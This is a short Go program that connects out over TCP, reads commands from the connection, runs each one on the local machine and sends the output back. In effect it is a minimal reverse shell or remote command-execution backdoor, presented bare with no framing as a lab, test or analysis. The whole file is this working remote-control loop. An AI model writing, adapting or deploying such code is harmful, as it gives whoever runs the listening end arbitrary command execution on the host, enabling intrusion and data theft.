package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conne, err := net.Dial("tcp", ":8080")
	for {
		if err != nil {
			fmt.Println(err)
			return
		}
		buff := make([]byte, 1024)
		nbytes, err := conne.Read(buff[:])
		if err != nil {
			fmt.Println(err)
			return
		}
		// fmt.Println(string(buff[:nbytes]))
		command_sliced := string(buff[:nbytes])
		command_sliced = command_sliced[0 : len(command_sliced)-1]
		command := strings.Fields(command_sliced)
		cmd := exec.Command(command[0], command[1:]...)
		out, err := cmd.Output()
		if err != nil {
			fmt.Println(err)
		} else {
			go sendOutput(conne, out)

		}

	}

}

func sendOutput(conne net.Conn, output []byte) {
	conne.Write(output)
}
